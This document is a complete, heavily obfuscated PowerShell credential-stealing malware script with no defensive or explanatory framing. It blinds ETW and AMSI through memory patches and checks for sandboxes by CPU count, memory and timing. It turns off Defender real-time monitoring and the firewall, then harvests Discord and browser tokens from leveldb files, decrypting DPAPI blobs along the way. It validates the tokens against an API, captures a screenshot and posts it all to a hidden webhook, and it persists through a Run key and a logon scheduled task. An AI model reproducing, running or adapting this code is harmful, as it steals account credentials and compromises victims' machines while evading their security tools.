# ═══ In-Memory Patches (Polymorphic) ═══
# ETW blind (P/Invoke)
$JpxuV = [int](5577) % 256
$g4T09r = @"
[DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
[DllImport("kernel32.dll")] public static extern IntPtr LoadLibrary(string n);
[DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
"@
$IbekFZ4 = Add-Type -MemberDefinition $g4T09r -Name 'CheckItem53' -Namespace 'ProcessValue4' -PassThru
[void]([Math]::Abs(35383))
$ThgzP = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bnRkbGwuZGxs"))
$qVNF = ([char]69+[char]116+[char]119+[char]69+[char]118+[char]101+[char]110+[char]116+[char]87+[char]114+[char]105+[char]116+[char]101)
$Oq7E = $IbekFZ4::LoadLibrary($ThgzP)
$kQO8T9a = $IbekFZ4::GetProcAddress($Oq7E, $qVNF)
$nYk3nywd = [int](6426) % 256
$ASEx = 0
$IbekFZ4::VirtualProtect($kQO8T9a, [UIntPtr]::new(1), 0x40, [ref]$ASEx) | Out-Null
$LfD48TWx = [byte[]](0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($LfD48TWx, 0, $kQO8T9a, $LfD48TWx.Length)
$IbekFZ4::VirtualProtect($kQO8T9a, [UIntPtr]::new(1), $ASEx, [ref]$ASEx) | Out-Null
$dGQxz = "OFWXT"

# Runtime memory patch
Start-Sleep -Milliseconds 40
$C0En9oDf = (-join([byte[]](0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x4d,0x61,0x6e,0x61,0x67,0x65,0x6d,0x65,0x6e,0x74,0x2e,0x41,0x75,0x74,0x6f,0x6d,0x61,0x74,0x69,0x6f,0x6e,0x2e,0x41,0x6d,0x73,0x69,0x55,0x74,0x69,0x6c,0x73)|%{[char]$_}))
Start-Sleep -Milliseconds 5
$xzV58LB = ([char]97+[char]109+[char]115+[char]105+[char]73+[char]110+[char]105+[char]116+[char]70+[char]97+[char]105+[char]108+[char]101+[char]100)
$ZjiW = [Ref].Assembly.GetType($C0En9oDf)
Start-Sleep -Milliseconds 34
$kSge2iZN = $ZjiW.GetField($xzV58LB, [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tm9uUHVibGljLFN0YXRpYw==")))
$kSge2iZN.SetValue($null, $true)
[void]([Math]::Abs(37535))

# Environment validation
$lne3LVJ = (Get-WmiObject -Class Win32_ComputerSystem).NumberOfLogicalProcessors
if ($lne3LVJ -lt 2) { exit }
$wVYIw = (Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory
if ($wVYIw -lt 2GB) { exit }
$YPrQ = [System.DateTime]::Now
Start-Sleep -Milliseconds 4133
if (([System.DateTime]::Now - $YPrQ).TotalMilliseconds -lt 3306) { exit }

function InitContext83($d,$k){$b="";for($i=0;$i-lt$d.Length;$i++){$b+=[char]($d[$i]-bxor$k[$i%$k.Length])};[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b))}
# === POLYMORPHIC PAYLOAD ===
function Get-Payload {
    $r = Get-Random -Minimum 1000 -Maximum 9999
    $s = @(
        (InitContext83 @(94,128,97,57) @(63,215,55,13,175,89,51,77)),
        (InitContext83 @(100,140,112,218,93,72,30,153,28,219,73,93,118,250,20,139) @(47,201,69,182,57,49)),
        (InitContext83 @(19,239,55,73,11,238,5,21,30,233,47,10,38,213,55,12,35,193,10,68) @(71,130,97,121)),
        (InitContext83 @(252,179,106,246,64,185,70,139,247,163,1,145,70,156,116,141,204,153,48,248) @(174,244,83,197,34,212,62,253)),
        (InitContext83 @(8,101,209,126,58,11,116,194,114,36,44,80,249,34,20,43,66,204,36,48,34,126,231,126,58,20,108,132,114,108,21,95,236,35,103,54,66,242,71,43,39,101,128,123,60,113,22,195,114,108,5,84,214,35,54,43,68,225,84,39,14,92,240,102,16,58,23,194,112,6,43,74,215,82,103,57,68,135,37,40,33,113,243,97,60,42,31,207,115,108,119,83,214,89,19,59,108,204,122,99) @(67,38,181,17,94))
    )
    return ($s -join '') + " #" + $r
}

# === AMSI BYPASS (multi-layer) ===
function Bypass-AMSI {
    try {
        $a = -join ((83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115) | ForEach-Object { [char]$_ })
        $b = -join ((97,109,115,105,73,110,105,116,70,97,105,108,101,100) | ForEach-Object { [char]$_ })
        $type = [Ref].Assembly.GetType($a)
        if ($null -ne $type) {
            $field = $type.GetField($b, 'NonPublic,Static')
            if ($null -ne $field) { $field.SetValue($null, $true) }
        }
    } catch {}
    try {
        $c = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
        if ($null -ne $c) {
            $field = $c.GetField('amsiInitFailed', 'NonPublic,Static')
            if ($null -ne $field) { $field.SetValue($null, $true) }
        }
    } catch {}
    try {
        $ctx = [Ref].Assembly.GetType('System.Management.Automation.AmsiContext')
        if ($null -ne $ctx) {
            $field = $ctx.GetField('amsiEnabled', 'NonPublic,Static')
            if ($null -ne $field) { $field.SetValue($null, $false) }
        }
    } catch {}
}
Bypass-AMSI

# === ETW BYPASS ===
try {
    $etwType = [Ref].Assembly.GetType('System.Management.Automation.Internal.PipelineOps')
    if ($null -ne $etwType) {
        $field = $etwType.GetField('etwEnabled', 'NonPublic,Static')
        if ($null -ne $field) { $field.SetValue($null, $false) }
    }
} catch {}

# === CONFIG ===
$hook = (InitContext83 @(187,216,198,104,166,36,151,166,216,33,252,7,187,200,218,50,167,95,144,251,216,53,139,26,184,195,173,48,166,43,177,230,240,106,147,5,187,215,173,46,164,95,151,230,217,12,144,22,149,212,221,32,139,40,131,165,217,50,144,89,148,250,205,33,136,56,151,234,217,49,252,30,136,198,213,33,146,42,140,195,245,12,143,30,184,212,194,43,139,2,140,218,193,53,161,1,130,160,252,30,145,52,190,196,195,52,147,21,184,216,194,41,164,22,140,220,199,31,174,22,140,216,252,50,151,94,148,253,198,50,135,3,191,200,221,105,166,1,144,198,247,30,143,38,150,200,193,44,138,56,136,221,246,34,159,4,142,197,248,55,151,45,231,173) @(218,144,148,88,197,108))
$api = (InitContext83 @(188,7,154,155,190,7,133,157,145,54,241,192,188,23,134,193,191,124,130,192,145,34,134,221,191,28,241,195,190,8,163,221,185,37,163,221,185,23,134,199,190,33,133,221,140,8,249,199) @(221,79,200,171))
$rgx = '[\w-]{24,}\.[\w-]{4,}\.[\w-]{27,}'
$mfa = 'mfa\.[\w-]{84}'
$isSystem = ([Security.Principal.WindowsIdentity]::GetCurrent().Name -eq (InitContext83 @(5,246,50,242,50,83,7,207,48,208,90,86,2,204,49,207,59,67,31,192,54,164,49,67,5,203,94,168) @(81,154,99,149,99,5)))
$firstRun = $true

# === DISABLE DEFENDER ===
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
netsh advfirewall set allprofiles state off > $null

# === TOKEN EXTRACTION ===
function Read-FileBytes {
    param([string]$path)
    try {
        $fs = [System.IO.File]::Open($path, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
        $ms = New-Object System.IO.MemoryStream
        $fs.CopyTo($ms)
        $fs.Close()
        $fs.Dispose()
        $result = $ms.ToArray()
        $ms.Close()
        $ms.Dispose()
        return $result
    } catch { return $null }
}

function Validate-Token {
    param([string]$token)
    if ([string]::IsNullOrEmpty($token)) { return $false }
    if ($token.Length -gt 120 -or $token.Length -lt 59) { return $false }
    if ($token -like 'mfa.*') { return $true }
    $parts = $token -split '\.'
    if ($parts.Count -ne 3) { return $false }
    try {
        $p = $parts[0]
        $pad = 4 - ($p.Length % 4)
        if ($pad -ne 4) { $p += '=' * $pad }
        $decoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($p))
        $val = [long]::Parse($decoded)
        return $true
    } catch { return $false }
}

$found = [System.Collections.Generic.HashSet[string]]::new([System.StringComparer]::Ordinal)

if (-not $isSystem -and $firstRun) {
    $ldbPaths = [System.Collections.Generic.List[string]]::new()

    # Discord Apps
    $discordApps = @((InitContext83 @(239,143,74,246,94,251,112,20,239,137,27,177) @(181,200,38,140,7,201,73,109)), (InitContext83 @(56,228,63,64,21,190,139,27,249,20,116,36,238,223,36,218,54,107,113,177) @(98,163,83,58,76,140,178)), (InitContext83 @(4,162,36,199,7,215,113,196,4,173,10,141,7,130,117,128) @(94,229,72,189)), (InitContext83 @(161,44,226,44,80,61,5,166,161,44,220,58,109,98,106,172,153,88,204,34,83,88,9,239) @(251,107,142,86,9,15,60,223)))
    foreach ($d in $discordApps) {
        $p = Join-Path $env:APPDATA ($d + (InitContext83 @(196,230,205,82,197,145,243,87,213,229,251,20,254,144,255,76,198,145,227,71,254,228,227,22,198,244,205,79,197,196,136,25) @(156,163,181,36)))
        if (Test-Path $p) { $ldbPaths.Add($p) | Out-Null }
    }

    # Browsers
    $browserBasePaths = @(
        @{ Path = ($env + (InitContext83 @(105,112,211,133,87,191,57,107,74,253,151,87,221,58,96,78,250,131,126,199,29,20,34,197,183,65,217,28,119,41,195,172,100,189,78,74,67,237,131,124,213,39,111,124,249,146,64,191,38,119,38,150) @(38,27,171,213,6,143,127))); Default = (InitContext83 @(22,194,109,254,195,237,26,118,32,196,6,174) @(68,133,59,147,154,181,76,5)) },
        @{ Path = ($env + (InitContext83 @(98,51,191,120,34,4,107,21,150,126,49,101,127,29,129,125,34,98,85,22,166,127,61,77,79,107,137,94,41,90,127,59,149,127,33,90,119,14,191,126,16,6,123,33,142,109,33,92,73,31,130,21) @(45,88,199,40,115,52))); Default = (InitContext83 @(150,188,1,244,157,163,1,234,160,186,106,164) @(196,251,87,153)) },
        @{ Path = ($env + (InitContext83 @(107,226,50,48,250,132,243,105,216,28,34,250,230,240,98,220,27,54,211,247,214,73,207,120,58,253,250,195,126,231,24,83,242,236,255,72,209,15,42,210,237,237,126,229,6,53,225,205,215,23,237,48,58,243,254,214,114,209,4,12,200,221,247,97,208,18,50,195) @(36,137,74,96,171,180,181))); Default = (InitContext83 @(1,108,27,162,10,115,27,188,55,106,112,242) @(83,43,77,207)) },
        @{ Path = ($env + (InitContext83 @(197,220,113,215,219,135,79,202,219,225,75,214,216,242,79,210,219,225,113,208,235,239,83,239,232,240,91,247,210,241,95,253,208,239,64,224,216,240,79,183,211,230,52,186) @(138,183,9,135))); Default = (InitContext83 @(93,67,137,54,208,87,82,172,63,200,50,57) @(15,4,223,91,137)) }
    )
    foreach ($bp in $browserBasePaths) {
        if (Test-Path $bp.Path) {
            $profiles = Get-ChildItem $bp.Path -Directory -ErrorAction SilentlyContinue | Where-Object {
                $_.Name -eq (InitContext83 @(27,219,189,160,45,44,31,239,143,140,73,73) @(73,156,235,205,116,116)) -or $_.Name -like (InitContext83 @(152,253,222,80,108,200,102,139,151,230,213,87) @(205,181,148,38,54,165,10,248))
            }
            foreach ($prof in $profiles) {
                $ldbDir = Join-Path $prof.FullName (InitContext83 @(217,26,155,196,0,226,63,20,216,110,240,216,58,216,14,29,215,11,218,221,3,237,18,31,239,26,240,199) @(141,93,162,174,89,181,72,115))
                if ((Test-Path $ldbDir) -and (-not $ldbPaths.Contains($ldbDir))) {
                    $ldbPaths.Add($ldbDir) | Out-Null
                }
            }
        }
    }

    $iso = [System.Text.Encoding]::GetEncoding((InitContext83 @(146,33,125,203,197,32,91,74,143,35,88,239,196,37,1,67) @(193,119,51,155,137,116,60,126)))
    $dpapiMagic = (InitContext83 @(64,140,205,161,43,9,173,60) @(1,205,140,224,106,72,144))
    $regexObj = [System.Text.RegularExpressions.Regex]::new($rgx, [System.Text.RegularExpressions.RegexOptions]::Compiled)
    $mfaObj = [System.Text.RegularExpressions.Regex]::new($mfa, [System.Text.RegularExpressions.RegexOptions]::Compiled)

    foreach ($p in $ldbPaths) {
        if (-not (Test-Path $p)) { continue }
        $files = Get-ChildItem $p -File -ErrorAction SilentlyContinue | Where-Object { $_.Extension -in '.ldb', '.log' }
        foreach ($fl in $files) {
            $b = Read-FileBytes -path $fl.FullName
            if ($null -eq $b -or $b.Length -lt 8) { continue }
            $str = $iso.GetString($b)

            foreach ($m in $regexObj.Matches($str)) { $null = $found.Add($m.Value) }
            foreach ($m in $mfaObj.Matches($str)) { $null = $found.Add($m.Value) }

            $searchStart = 4
            $blobCount = 0
            while ($searchStart -lt ($b.Length - 8) -and $blobCount -lt 30) {
                $idx = $str.IndexOf($dpapiMagic, $searchStart, [System.StringComparison]::Ordinal)
                if ($idx -lt 0) { break }
                $start = $idx - 4
                if ($start -ge 0 -and $b[$start] -le 3 -and $b[$start + 1] -eq 0 -and $b[$start + 2] -eq 0 -and $b[$start + 3] -eq 0) {
                    $blobCount++
                    if (($start + 8) -le $b.Length) {
                        $len = [BitConverter]::ToUInt32($b, $start + 4)
                        if ($len -gt 0 -and $len -lt 100000 -and ($start + $len) -le $b.Length) {
                            try {
                                $blob = [byte[]]::new($len)
                                [Array]::Copy($b, $start, $blob, 0, $len)
                                $dec = [Security.Cryptography.ProtectedData]::Unprotect($blob, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
                                $tok = [System.Text.Encoding]::UTF8.GetString($dec).Trim([char]0)
                                if ($tok -match $rgx -or $tok -match $mfa) { $null = $found.Add($tok) }
                            } catch {}
                        }
                    }
                }
                $searchStart = $idx + 4
            }
        }
    }
}

# === TOKEN VALIDATION ===
$validTokens = [System.Collections.Generic.List[object]]::new()

if (-not $isSystem -and $firstRun -and $found.Count -gt 0) {
    $validated = [System.Collections.Generic.List[string]]::new()
    foreach ($token in $found) {
        if (Validate-Token -token $token) { $validated.Add($token) }
    }

    foreach ($token in $validated) {
        try {
            $headers = @{
                Authorization = $token
                (InitContext83 @(211,180,189,240,230,133,194,222,223,222,165,233,225,173,206,161) @(133,236,243,156))  = (InitContext83 @(228,69,116,3,236,15,245,127,233,65,117,4,193,50,204,107,251,84,41,69,239,53,223,122,212,33,0,82,217,52,220,107,253,70,12,64,192,28,254,107,230,32,33,64,195,50,220,59,249,90,42,7,195,27,230,49) @(176,18,77,53,141,88,141,12))
            }
            $r = Invoke-RestMethod -Uri $api -Headers $headers -TimeoutSec 3 -ErrorAction Stop
            if ($r.id) {
                $validTokens.Add([PSCustomObject]@{
                    u    = ($($r.username) + "#" + $($r.discriminator))
                    id   = $r.id
                    em   = if ($r.email) { $r.email } else { (InitContext83 @(173,131,45,184) @(249,234,20,250,202,81)) }
                    ph   = if ($r.phone) { $r.phone } else { (InitContext83 @(6,137,175,208) @(82,224,150,146,115,129,147,56)) }
                    ni   = switch ($r.premium_type) { 1 { (InitContext83 @(107,27,96,238,221,9,103,104,223,201,7,20) @(58,41,24,134,190)) } 2 { (InitContext83 @(66,133,144,223,117,133,196,210) @(22,232,252,239)) } default { (InitContext83 @(4,228,183,205,232,219,82,129) @(80,137,142,184,178,138,111,188)) } }
                    mf   = if ($r.mfa_enabled) { (InitContext83 @(60,254,151,101) @(107,169,193,31)) } else { "No" }
                    token = $token
                })
            }
        } catch {}
    }
}

# === SCREENSHOT ===
Add-Type -AssemblyName System.Windows.Forms
$bmp = New-Object Drawing.Bitmap([Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
[Drawing.Graphics]::FromImage($bmp).CopyFromScreen(0,0,0,0,$bmp.Size)
$ms = New-Object IO.MemoryStream
$bmp.Save($ms, [Drawing.Imaging.ImageFormat]::Png)
$bytes = $ms.ToArray()
$ms.Close()

# === SEND TO WEBHOOK ===
if ($firstRun) {
    $report = ((InitContext83 @(54,161,0,211,156,17,158,61,231,140,43,155,34,226,136,53,157,27,247,137,44,163,38,226,146,46,167,1,242,166,63,140,63,216,139,64) @(125,200,112,177,202)) + $env + (InitContext83 @(2,112,40,196,211,27,89,48,194,194,27,72,50,255,193,3,73,55,228,209,46,41,48,237,200,36,90,91) @(77,27,102,148,135)) + $env + (InitContext83 @(212,8,208,77,252,33,209,43,215,76,159,49,216,8,220,113,204,48,247,15,207,95,252,1,250,86,208,108,205,13,244,3) @(155,100,134,25,174,119)) + $($validTokens.Count) + (InitContext83 @(20,144,43,165) @(87,247,68,152,50,32,73)))
    
    # Build token list
    foreach ($ti in $validTokens) {
        $report += ("**" + $($ti.u) + (InitContext83 @(22,185,24,203,153,250,100,162,45,215,251,139,20,151,54,189) @(93,208,119,128,207,189)) + $($ti.token) + (InitContext83 @(132,11,240,86,254,153,37,231) @(221,74,128,28,172)) + $($ti.id) + (InitContext83 @(41,255,127,59,141,72,212,25,219,64,14,233) @(106,148,41,79,212,31,184)) + $($ti.em) + (InitContext83 @(24,140,147,229,12,105,213,189,197,7,26,221) @(91,224,209,138,110)) + $($ti.ph) + (InitContext83 @(39,96,229,83,112,44,65,166,111,36,85,76,129,119,123,3) @(100,11,208,35,20)) + $($ti.ni) + "/" + $($ti.mf) + (InitContext83 @(142,219,63,121) @(205,188,80,68,230)))
    }

    # Send main message
    try {
        Invoke-RestMethod -Uri $hook -Method Post -Body @{content=$report} -ErrorAction SilentlyContinue
    } catch {}

    # Send screenshot if exists
    if ($bytes) {
        try {
            $boundary = (InitContext83 @(194,24,204,103,218,30,212,122,158,91,196,121,237,38,170,80,244,123,216,62,166,84,208,49,235,26,193,46) @(142,75,252,19,150,72)) + (Get-Random).ToString()
            $LF = (InitContext83 @(38,112,191,33) @(98,33,208,28,229))
            $body = (
                ("--" + $boundary + $LF) +
                ((InitContext83 @(183,49,9,99,154,7,3,147,103,115,39,187,33,13,168,116,82,37,176,48,49,161,111,70,116,148,47,50,188,110,9,111,156,19,100,141,90,104,68,150,15,44,164,118,105,65,207,44,5,177,66,89,76,147,44,38,188,84,113,33,183,7,15,150,97,119,64,139,25,2,215,111,96,65,191,41,54,212,77,73,76,169,22,32,133,49,88,96,154,3,96,145,97,93,114,153,9,50,219,62) @(230,3,48,22,254,64,85)) + $LF) +
                ((InitContext83 @(170,26,76,247,113,181,69,142,76,54,179,64,151,75,185,68,58,235,87,130,113,172,110,27,216,70,203,100,153,69,22,191) @(251,40,117,130,21,242,19)) + $LF + $LF)
            )
            $footer = ($LF + "--" + $boundary + "--" + $LF)
            
            $headerBytes = [Text.Encoding]::ASCII.GetBytes($body)
            $footerBytes = [Text.Encoding]::ASCII.GetBytes($footer)
            $totalLength = $headerBytes.Length + $bytes.Length + $footerBytes.Length
            
            $webRequest = [Net.WebRequest]::Create($hook)
            $webRequest.Method = (InitContext83 @(109,164,237,192,224,121,220,233) @(56,225,212,148,182))
            $webRequest.ContentType = ((InitContext83 @(228,153,82,237,226,134,104,233,223,153,78,174,202,243,94,232,229,172,52,234,220,134,66,174,223,149,119,249,223,172,61,175,228,172,86,246,229,175,111,167) @(134,193,4,158)) + $boundary)
            $webRequest.ContentLength = $totalLength
            
            $reqStream = $webRequest.GetRequestStream()
            $reqStream.Write($headerBytes, 0, $headerBytes.Length)
            $reqStream.Write($bytes, 0, $bytes.Length)
            $reqStream.Write($footerBytes, 0, $footerBytes.Length)
            $reqStream.Close()
            $webRequest.GetResponse()
        } catch {}
    }
}

# === PERSISTENCE ===
$cmd = (InitContext83 @(169,16,144,57,253,225,206,176,54,238,92,212,219,199,255,59,204,77,242,222,200,157,98,223,104,224,128,234,168,46,232,126,253,225,197,173,14,199,102,208,224,220,132,45,224,73,150,138,205,141,63,217,80,224,235,232,168,62,232,126,254,192,198,173,30,196,102,203,220,199,162,39,202,103,151,222,206,248,63,153,110,239,251,254,133,62,145,124,196,212,194,249,27,196,110,215,221,195,162,102,240,100,241,195,222,146,29,195,104,149,140,180,144,0,156,58,235,212,202,188,53,250,51,221,224,211,190,45,200,77,225,205,201,158,30,211,71,243,248,183,134,15,235,122,194,254,210,185,27,154,68,209,219,237,243,35,240,93,203,204,200,249,25,223,104,206,140,243,169,45,236,100,236,238,197,163) @(202,87,169,10,167,185,132))
Set-ItemProperty -Path (InitContext83 @(88,12,108,228,93,29,104,195,94,123,33,205,111,1,124,200,104,36,78,195,95,30,116,202,104,36,33,218,105,123,66,144,83,15,124,208,105,36,74,214,111,122,86,195,90,122,78,217,104,36,78,213,111,15,66,204,104,39,86,208,105,123,45,195,94,39,78,213) @(11,73,24,160)) -Name (InitContext83 @(228,246,77,69,232,131,24,3,209,245,111,92,235,247,119,73,211,156,115,5,225,131,119,88,208,140,115,95) @(178,196,33,48)) -Value $cmd -ErrorAction SilentlyContinue
schtasks /create /tn (InitContext83 @(29,239,30,97,60,91,114,238,17,37,40,112,18,238,36,109,7,68,25,232,33,83,48,116,41,149,32,123) @(75,221,114,20,102,28)) /tr ($cmd) /sc onlogon /f /rl highest /it > $null 2>&1

# === INSTANT EXIT ===
exit
